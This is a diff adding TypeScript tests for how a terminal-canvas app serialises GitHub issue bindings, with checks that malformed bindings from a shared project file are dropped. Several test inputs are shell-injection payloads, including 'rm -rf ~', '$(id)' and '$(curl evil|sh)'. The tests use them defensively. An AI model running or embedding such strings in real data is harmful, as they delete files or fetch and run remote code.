@@ -688,6 +688,75 @@ describe('node icon serialization', () => {
   })
 })
 
+describe('issueRef serialization (GitHub issue binding)', () => {
+  const withIssue = (issueRef: unknown): CanvasNode =>
+    ({
+      id: 't1',
+      type: 'terminal',
+      position: { x: 0, y: 0 },
+      width: 320,
+      height: 240,
+      data: { title: 'T', color: '#888', group: null, agentId: 'claude', issueRef }
+    }) as unknown as CanvasNode
+
+  const stateWithIssue = (issueRef: unknown) => ({
+    id: 't1',
+    kind: 'terminal' as const,
+    position: { x: 0, y: 0 },
+    size: { width: 320, height: 240 },
+    title: 'T',
+    color: '#888',
+    group: null,
+    agentId: 'claude',
+    issueRef
+  })
+
+  const ref = { owner: 'eneskirca', repo: 'nodeterm', number: 42 }
+
+  it('round-trips a valid binding', () => {
+    const states = flowToNodeStates([withIssue(ref)])
+    expect(states[0].issueRef).toEqual(ref)
+    expect(nodeStatesToFlow(states)[0].data.issueRef).toEqual(ref)
+  })
+
+  it('tolerates its absence: a node saved before the feature hydrates with no binding', () => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const { issueRef: _omit, ...legacy } = stateWithIssue(undefined) as any
+    const flow = nodeStatesToFlow([legacy])
+    expect(flow[0].data.issueRef).toBeUndefined()
+    expect(flow[0].data.agentId).toBe('claude')
+    expect(flowToNodeStates(flow)[0].issueRef).toBeUndefined()
+  })
+
+  // project.json is git-shared: a clone can carry anything here. A malformed binding is DROPPED
+  // (the node survives; only the chip and history go) rather than repaired.
+  it.each([
+    'eneskirca/nodeterm#42',
+    { owner: 'o', repo: 'r' },
+    { owner: 'o', repo: 'r', number: '42' },
+    { owner: 'o;rm -rf ~', repo: 'r', number: 1 },
+    { owner: 'o', repo: 'r`id`', number: 1 },
+    { owner: 'o', repo: '$(id)', number: 1 },
+    { owner: 'o', repo: 'r\nrm', number: 1 },
+    { owner: 'o', repo: 'r', number: 0 }
+  ])('drops a malformed binding %j on the way IN', (bad) => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const flow = nodeStatesToFlow([stateWithIssue(bad) as any])
+    expect(flow[0].data.issueRef).toBeUndefined()
+    expect(flow[0].id).toBe('t1')
+  })
+
+  it('drops a malformed binding on the way OUT', () => {
+    expect(flowToNodeStates([withIssue({ owner: 'o', repo: 'r;x', number: 1 })])[0].issueRef).toBeUndefined()
+  })
+
+  it('strips unknown keys a hostile file smuggles in beside a valid binding', () => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const flow = nodeStatesToFlow([stateWithIssue({ ...ref, title: '$(curl evil|sh)' }) as any])
+    expect(flow[0].data.issueRef).toEqual(ref)
+  })
+})
+
 describe('resolveNewNodeAccount', () => {
   const accounts = [{ id: 'a1', label: 'work', createdAt: 0 }]
   it('prefers the explicit pick', () =>
